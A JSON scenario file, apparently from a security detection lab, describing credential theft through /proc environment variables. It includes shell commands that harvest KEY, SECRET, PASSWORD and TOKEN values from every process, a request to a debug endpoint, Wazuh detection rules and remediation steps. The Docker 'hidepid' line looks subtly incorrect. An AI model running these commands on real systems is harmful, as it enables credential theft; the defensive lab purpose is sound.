@@ -1,0 +1,180 @@
+{
+  "id": "S1-04",
+  "name": "Environment Variable Exposure via /proc",
+  "category": "API Keys & Secrets",
+  "version": "1.0",
+  "description": "Extract secrets from process environment variables via /proc filesystem",
+  "difficulty": "Medium",
+  "real_world_relevance": "Container escape scenarios, shared hosting compromises",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Discovery"],
+    "techniques": [
+      {"id": "T1552.001", "name": "Unsecured Credentials: Credentials In Files"},
+      {"id": "T1057", "name": "Process Discovery"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["vulnerable-app", "cloud-workload"],
+    "network": "cloud_net",
+    "permissions": "Read access to /proc (often available in containers)"
+  },
+
+  "attack_flow": {
+    "description": "Attacker reads environment variables containing secrets from /proc filesystem",
+    "diagram": [
+      "1. Attacker gains shell access (RCE, container escape)",
+      "2. Attacker enumerates running processes",
+      "3. Attacker reads /proc/<pid>/environ for each process",
+      "4. Attacker extracts secrets from environment variables",
+      "5. Attacker uses extracted credentials"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Process Discovery",
+      "description": "Enumerate running processes",
+      "actions": [
+        {
+          "type": "command",
+          "command": "ps aux | grep -E '(python|node|java|app)'",
+          "expected_output_contains": ["python", "app.py"]
+        }
+      ]
+    },
+    {
+      "name": "Environment Enumeration",
+      "description": "Read environment variables from /proc",
+      "actions": [
+        {
+          "type": "command",
+          "command": "cat /proc/1/environ | tr '\\0' '\\n' | grep -E '(KEY|SECRET|PASSWORD|TOKEN)'",
+          "expected_output_contains": ["AWS_SECRET_ACCESS_KEY", "DATABASE_PASSWORD"]
+        }
+      ]
+    },
+    {
+      "name": "Mass Extraction",
+      "description": "Extract secrets from all accessible processes",
+      "critical": true,
+      "actions": [
+        {
+          "type": "command",
+          "command": "for pid in $(ls /proc | grep -E '^[0-9]+$'); do cat /proc/$pid/environ 2>/dev/null | tr '\\0' '\\n'; done | grep -E '(KEY|SECRET|PASSWORD|TOKEN)' | sort -u",
+          "description": "Iterate all processes and extract secrets"
+        }
+      ]
+    },
+    {
+      "name": "Debug Endpoint",
+      "description": "Access debug endpoint that exposes environment",
+      "actions": [
+        {
+          "type": "http_request",
+          "target": "http://172.41.0.20:8888/debug",
+          "method": "GET",
+          "expected_response_contains": ["AWS_ACCESS_KEY_ID", "environment"]
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "File Access",
+      "description": "Read access to /proc/*/environ files",
+      "wazuh_rule": "100607"
+    },
+    {
+      "type": "Process",
+      "description": "Commands iterating /proc for environment extraction",
+      "wazuh_rule": "100608"
+    },
+    {
+      "type": "Web Access",
+      "description": "Access to debug endpoints exposing environment",
+      "wazuh_rule": "100609"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100607",
+      "level": 10,
+      "description": "NHI: /proc/environ access detected - credential theft attempt"
+    },
+    {
+      "rule_id": "100608",
+      "level": 12,
+      "description": "NHI: Mass environment variable extraction from /proc"
+    },
+    {
+      "rule_id": "100609",
+      "level": 10,
+      "description": "NHI: Debug endpoint accessed - environment exposure"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Restrict /proc access in containers (hidepid mount option)",
+      "Disable debug endpoints in production",
+      "Rotate all exposed credentials"
+    ],
+    "long_term": [
+      "Use secrets mounted as files, not environment variables",
+      "Implement proper secret management (Vault, AWS Secrets Manager)",
+      "Run containers with minimal privileges",
+      "Use seccomp profiles to restrict syscalls"
+    ],
+    "docker_security": [
+      "# Mount /proc with hidepid",
+      "docker run --mount type=tmpfs,destination=/proc,tmpfs-mode=0555 ...",
+      "",
+      "# Use read-only root filesystem",
+      "docker run --read-only ...",
+      "",
+      "# Drop all capabilities",
+      "docker run --cap-drop=ALL ..."
+    ],
+    "kubernetes_security": [
+      "# Pod security context",
+      "securityContext:",
+      "  readOnlyRootFilesystem: true",
+      "  allowPrivilegeEscalation: false",
+      "  capabilities:",
+      "    drop: [\"ALL\"]"
+    ]
+  },
+
+  "demo_script": {
+    "container": "vulnerable-app",
+    "commands": [
+      "# Read environment from PID 1",
+      "cat /proc/1/environ | tr '\\0' '\\n'",
+      "",
+      "# Search for secrets in all processes",
+      "grep -r SECRET /proc/*/environ 2>/dev/null | head -5",
+      "",
+      "# Access debug endpoint",
+      "curl -s http://localhost:8888/debug | jq '.environment'"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "Linux /proc Filesystem",
+      "url": "https://man7.org/linux/man-pages/man5/proc.5.html"
+    },
+    {
+      "title": "Container Security - /proc Hardening",
+      "url": "https://docs.docker.com/engine/security/"
+    },
+    {
+      "title": "MITRE ATT&CK T1552.001",
+      "url": "https://attack.mitre.org/techniques/T1552/001/"
+    }
+  ]
+}
